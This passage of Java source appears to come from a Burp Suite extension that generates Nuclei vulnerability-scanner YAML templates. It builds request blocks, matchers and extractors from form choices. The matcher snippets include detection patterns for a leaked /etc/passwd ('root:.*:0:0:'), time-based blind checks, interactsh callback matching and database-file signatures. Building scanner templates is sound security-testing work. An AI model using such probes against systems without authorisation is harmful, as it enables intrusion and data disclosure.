                ArrayList<String> algStrs = new ArrayList<String>();
                Config.reqMode[] backends = Config.reqMode.values();
                for (Config.reqMode backend : backends) {
                    algStrs.add(backend.name().replace('_', '/'));
                }
                return algStrs.toArray(new String[algStrs.size()]);
            }

            private String[] GetSeverityModes() {
                ArrayList<String> algStrs = new ArrayList<String>();
                Config.severityMode[] backends = Config.severityMode.values();
                for (Config.severityMode backend : backends) {
                    algStrs.add(backend.name().replace('_', '/'));
                }
                return algStrs.toArray(new String[algStrs.size()]);
            }

            private String[] GetBodyModes() {
                ArrayList<String> algStrs = new ArrayList<String>();
                Config.ContentBodyMode[] backends = Config.ContentBodyMode.values();
                for (Config.ContentBodyMode backend : backends) {
                    algStrs.add(backend.name().replace('_', '/'));
                }
                return algStrs.toArray(new String[algStrs.size()]);
            }

            private String[] GetHeadersModes() {
                ArrayList<String> algStrs = new ArrayList<String>();
                Config.ContentTypeMode[] backends = Config.ContentTypeMode.values();
                for (Config.ContentTypeMode backend : backends) {
                    algStrs.add(backend.name().replace('_', '/'));
                }
                return algStrs.toArray(new String[algStrs.size()]);
            }

            private String[] GetRedirectsModes() {
                ArrayList<String> algStrs = new ArrayList<String>();
                Config.RedirectsMode[] backends = Config.RedirectsMode.values();
                for (Config.RedirectsMode backend : backends) {
                    algStrs.add(backend.name().replace('_', '/'));
                }
                return algStrs.toArray(new String[algStrs.size()]);
            }

        });
    }


    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
    }

    @Override
    public String getTabCaption()
    {
        return "Nu_Te_Gen";
    }

    @Override
    public Component getUiComponent() {
        return tabs;
    }

    private String Yaml_Gen(String TP_Id,String TP_Name,String TP_Author,String TP_Description,String TP_Tags,String TP_IsRedirect,String TP_Redirect_Num,String TP_Req,String TP_Path,String TP_Header,String TP_Body,String Tp_Severity){
        String data = "";

        String id_info = "id: %s\n\n" +
                "info:\n" +
                "  name: %s\n" +
                "  author: %s\n" +
                "  severity: %s\n" +
                "  description: |\n" +
                "    %s\n"+
                "  metadata:\n" +
                "    - fofa-query: \n" +
                "    - shodan-query: \n" +
                "    - hunter-query: \n" +
                "  reference:\n" +
                "    - https://\n" +
                "  tags: %s\n\n";
        data += String.format(id_info, TP_Id,TP_Name,TP_Author,Tp_Severity,TP_Description,TP_Tags);

        String raw_requests = "http:\n" +
                "  - raw:\n" +
                "      - |\n" +
                "        POST %s HTTP/1.1\n" +
                "        Host: {{Hostname}}\n" +
                "        Content-Type: %s\n" +
                "\n" +
                "        %s\n\n";

        String requests = "http:\n"+
                "  - method: %s\n"+
                "    path:\n"+
                "      - \"{{BaseURL}}%s\"\n\n";

        String Header="    headers:\n"+
                "      Content-Type: %s\n\n";

        String Body="    body: |\n"+
                "      替换此处注意每行缩进\n\n";

        String redirects = "    host-redirects: true\n" +
                "    max-redirects: %s\n\n";

        String Matchers="    matchers-condition: and\n" +
                "    matchers:\n";

        String MatchersWord = "      - type: word\n" +
                "        part: body\n" +
                "        words:\n" +
                "          - 'test1'\n" +
                "          - 'test2'\n" +
                "        condition: or\n\n";

        String MatchersHeader = "      - type: word\n" +
                "        part: header\n" +
                "        words:\n" +
                "          - 'tomcat'\n\n";

        String MatchersStatus = "      - type: status\n" +
                "        status:\n" +
                "          - 200\n\n";

        String MatchersNegative = "      - type: word\n" +
                "        words:\n" +
                "          - \"荣耀立方\"\n" +
                "          - 'var model = \"LW-N605R\"'\n" +
                "        part: body\n" +
                "        negative: true\n" +
                "        condition: or\n\n";

        String MatchersTime = "      - type: dsl\n" +
                "        dsl:\n" +
                "          - 'duration>=6'\n\n";

        String MatchersSize = "      - type: dsl\n" +
                "        dsl:\n" +
                "          - 'len(body)<130'\n\n";

        String MatchersInteractsh_Protocol = "      - type: word\n" +
                "        part: interactsh_protocol  # 配合 {{interactsh-url}} 关键词使用\n" +
                "        words:\n" +
                "          - \"http\"\n\n";

        String MatchersInteractsh_Request = "      - type: regex\n" +
                "        part: interactsh_request   # 配合 {{interactsh-url}} 关键词使用\n" +
                "        regex:\n" +
                "          - \"root:.*:0:0:\"\n\n";

        String MatchersInteractsh_Regex = "      - type: regex\n" +
                "        regex:\n" +
                "          - \"root:.*:0:0:\"\n" +
                "        part: body\n\n";

        String MatchersInteractsh_Binary = "      - type: binary\n" +
                "        binary:\n" +
                "          - \"D0CF11E0\"  # db\n" +
                "          - \"53514C69746520\"  # SQLite\n" +
                "        part: body\n" +
                "        condition: or\n\n";

        String Extractors = "    extractors:\n" +
                "      - part: header\n" +
                "        internal: true\n" +
                "        group: 1\n" +
                "        type: regex\n" +
                "        regex:\n" +
                "          - 'Set-Cookie: PHPSESSID=(.*); path=/'\n\n";

        if (TP_Req=="RAW"){
            if (TP_Header=="urlencoded"){
                TP_Header = "application/x-www-form-urlencoded";
            }else if (TP_Header=="json"){
                TP_Header = "application/json";
            }

            if (TP_Body=="带"){
                TP_Body = "替换此处";
            }else if (TP_Body=="不带"){
                TP_Body = "";
            }

            data += String.format(raw_requests, TP_Path,TP_Header,TP_Body);
        } else {
            data += String.format(requests, TP_Req,TP_Path);
            if (TP_Header=="urlencoded"){
                data += String.format(Header,"application/x-www-form-urlencoded" );
            }else if (TP_Header=="json"){
                data += String.format(Header,"application/json" );
            }else if (TP_Header=="xml"){
                data += String.format(Header,"text/xml" );
            }

            if (!Objects.equals(TP_Body, "不带")){
                data += String.format(Body,TP_Body);
            }
        }

        if (TP_IsRedirect=="istrue"){
            data += String.format(redirects, TP_Redirect_Num);
        }

        if (match_true){
            data += Matchers;
        }
        if (match_word){
            data += MatchersWord;
        }
        if (match_header){
            data += MatchersHeader;
        }
        if (match_status){
            data += MatchersStatus;
        }
        if (match_negative){
            data += MatchersNegative;
        }
        if (match_time){
            data += MatchersTime;
        }
        if (match_size){
            data += MatchersSize;
        }
        if (match_interactsh_protocol){
            data += MatchersInteractsh_Protocol;
        }
        if (match_interactsh_request){
            data += MatchersInteractsh_Request;
        }
        if (match_regex){
            data += MatchersInteractsh_Regex;
        }
        if (match_binary){
            data += MatchersInteractsh_Binary;
        }

        if (extractors){
            data += Extractors;
        }

        return data;

    }

}
